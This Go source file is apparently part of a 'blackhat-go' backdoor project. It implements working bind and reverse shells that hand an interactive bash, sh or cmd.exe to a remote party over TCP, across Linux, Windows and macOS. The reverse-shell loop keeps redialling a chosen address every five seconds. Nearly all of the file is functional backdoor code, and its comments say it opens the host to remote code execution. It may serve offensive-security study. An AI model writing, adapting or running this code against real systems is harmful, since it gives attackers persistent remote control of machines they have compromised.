package serverbind

import (
	"blackhat-go/backdoor/scannertools"
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
	"runtime"
	"time"
)

func OperatingSystemDetect() *string {
	// Return the operating system runtime
	var osRuntime string = runtime.GOOS
	return &osRuntime
}

type ServerBindUserInputNetcat struct {
	scannertools.UserInputNetcat
}

func (uin *ServerBindUserInputNetcat) NcBindTwo() {
	var (
		bind        bool   = uin.Bind
		reverse     bool   = uin.Reverse
		port        int    = uin.Port
		address     string = uin.Address
		bindAddress string = fmt.Sprintf(":%d", port)
		osRuntime   string = runtime.GOOS
		callAddress string = fmt.Sprintf("%s:%d", address, port)
	)

	if bind && reverse {
		log.Fatalln("Cannot bind and reverse at the same time.")
	}

	if bind {
		listener, err := net.Listen("tcp", bindAddress)
		if err != nil {
			log.Fatalf("Unable to bind to port %s", bindAddress)
		}
		log.Println("[*] Binding shell spawning for remote code execution")
		for {
			conn, err := listener.Accept()
			log.Printf("Received connection from %s!\n", conn.RemoteAddr().String())
			if err != nil {
				log.Fatalln("Unable to accept connection.")
			}
			switch osRuntime {
			case "linux":
				go SimpleHandleLinux(conn)
			case "windows":
				go SimpleHandleWindows(conn)
			case "darwin":
				go SimpleHandleDarwin(conn)
			default:
				log.Fatalf("Unsupported OS, report bug for %s\n", osRuntime)
			}
		}
	}
	if reverse {
		for {
			caller, err := net.Dial("tcp", callAddress)
			if err != nil {
				log.Println(err)
				log.Println("[*] Retrying in 5 seconds")
				time.Sleep(5 * time.Second)
			}
			log.Printf("[*] Rev shell spawning, connecting to %s", callAddress)
			switch osRuntime {
			case "linux":
				RevHandleLinux(caller)
			case "windows":
				RevHandleWindows(caller)
			case "darwin":
				RevHandleDarwin(caller)
			default:
				log.Fatalf("Unsupported OS, report bug for %s\n", osRuntime)
			}
		}
	}
}

// Bind to local port, open up host to remote code execution
func NcBind(mappedUserInput map[string]string) {
	var (
		port      string = mappedUserInput["port"]
		address   string = fmt.Sprintf(":%s", port)
		osRuntime string = runtime.GOOS
	)

	listener, err := net.Listen("tcp", address)
	if err != nil {
		log.Fatalf("Unable to bind to port %s", address)
	}
	for {
		conn, err := listener.Accept()
		log.Printf("Received connection from %s!\n", conn.RemoteAddr().String())
		if err != nil {
			log.Fatalln("Unable to accept connection.")
		}
		switch osRuntime {
		case "linux":
			go SimpleHandleLinux(conn)
		case "windows":
			go SimpleHandleWindows(conn)
		default:
			log.Fatalf("Unsupported OS, report bug for %s\n", osRuntime)
			// fmt.Printf("Unsupported OS, report bug for %s\n", osRuntime)
			// os.Exit(1)
		}
	}
}

// Flusher wraps bufio.Writer, explicitly flushing on all writes
type Flusher struct {
	w *bufio.Writer
}

// Constructor NewFlusher creates a new Flusher from an io.Writer
func NewFlusher(w io.Writer) *Flusher {
	return &Flusher{
		w: bufio.NewWriter(w),
	}
}

// Write writes bytes and explicitly flushes buffer
func (foo *Flusher) Write(b []byte) (int, error) {
	count, err := foo.w.Write(b)
	if err != nil {
		return -1, err
	}
	if err := foo.w.Flush(); err != nil {
		return -1, err
	}
	return count, err
}

func DifficultHandle(conn net.Conn) {
	// Explicitly calling /bin/sh and using -i for interactive mode
	// so that we can use it for stdin and stdout
	// For Windows use exec.Command("cmd.exe")
	cmd := exec.Command("/bin/sh", "-i")

	// Set stdin for our connection
	cmd.Stdin = conn

	// Write writes bytes and explicitly flushes buffer
	cmd.Stdout = NewFlusher(conn)

	// Run the command
	if err := cmd.Run(); err != nil {
		log.Fatalln(err)
	}
}

func SimpleHandleLinux(conn net.Conn) {
	// Bind Shell
	// Explicitly calling /bin/sh and using -i for interactive mode
	// so that we can use it for stdin and stdout
	cmd := exec.Command("/bin/bash", "-i")
	// Set stdin to our connection
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func SimpleHandleWindows(conn net.Conn) {
	// Bind Shell
	// Explicitly calling cmd.exe for cmd execution
	// so that we can use it for stdin and stdout
	cmd := exec.Command("cmd.exe")
	// Set stdin to our connection
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func SimpleHandleDarwin(conn net.Conn) {
	// Bind Shell
	cmd := exec.Command("/bin/sh", "-i")
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func RevHandleLinux(caller net.Conn) {
	log.Println("Linux")
	cmd := exec.Command("/bin/bash")
	cmd.Stdin = caller
	cmd.Stdout = caller
	cmd.Stderr = caller
	cmd.Run()
	// caller.Close()
}

func RevHandleWindows(caller net.Conn) {
	log.Println("Windows")
	cmd := exec.Command("cmd.exe")
	cmd.Stdin = caller
	cmd.Stdout = caller
	cmd.Stderr = caller
	cmd.Run()
	// caller.Close()
}

func RevHandleDarwin(caller net.Conn) {
	log.Println("Darwin")
	cmd := exec.Command("/bin/bash")
	cmd.Stdin = caller
	cmd.Stdout = caller
	cmd.Stderr = caller
	cmd.Run()
	// caller.Close()
}
